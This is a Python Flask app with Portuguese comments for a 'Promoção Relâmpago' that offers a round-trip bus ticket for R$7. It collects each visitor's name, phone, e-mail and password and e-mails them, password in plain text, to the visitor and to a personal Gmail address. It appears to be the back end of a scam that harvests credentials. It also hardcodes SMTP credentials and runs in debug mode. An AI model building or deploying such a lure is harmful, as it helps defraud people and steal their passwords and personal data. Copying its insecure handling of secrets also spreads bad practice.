from flask import Flask, render_template, request
from flask_mail import Mail, Message

app = Flask(__name__)

# Configuração Mailtrap (você pode trocar para Gmail depois)
app.config['MAIL_SERVER'] = 'smtp.mailtrap.io'
app.config['MAIL_PORT'] = 2525
app.config['MAIL_USERNAME'] = '71fe3ef61076e7'
app.config['MAIL_PASSWORD'] = 'ffa1cc7f256de6'
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False

mail = Mail(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/cadastro', methods=['POST'])
def cadastro():
    nome = request.form['nome']
    telefone = request.form['telefone']
    email = request.form['email']
    senha = request.form['senha']

    # Destinatários: cliente + cópia para você
    destinatarios = [email, 'macristinaqueiroz47@gmail.com']

    # 💌 Mensagem com emojis e tom acolhedor
    corpo_email = f"""
🎉 Olá, {nome}!

Seu cadastro foi confirmado com sucesso na **Promoção Relâmpago**!  
Você garantiu um **ticket de ida e volta por apenas R$ 7,00!** 🚌💨

📌 Aqui estão os seus dados:
🔹 Nome: {nome}  
📞 Telefone: {telefone}  
📧 E-mail: {email}  
🔑 Senha cadastrada: {senha}

⚠️ **IMPORTANTE:** Essa senha é pessoal e intransferível.  
Por segurança, **não compartilhe com ninguém**.

📲 Fique de olho no seu WhatsApp ou e-mail! Em breve você receberá as próximas instruções para resgatar seu ticket.

Com carinho,  
**Equipe Promoção Ticket 💛**
"""

    msg = Message(
        subject='🎫 Confirmação de Cadastro - Promoção R$7,00',
        sender='macristinaqueiroz47@gmail.com',
        recipients=destinatarios,
        body=corpo_email
    )

    mail.send(msg)
    print(f"E-mail enviado para {email} e cópia para macristinaqueiroz47@gmail.com")

    return render_template('confirmacao.html', nome=nome)

if __name__ == '__main__':
    app.run(debug=True)
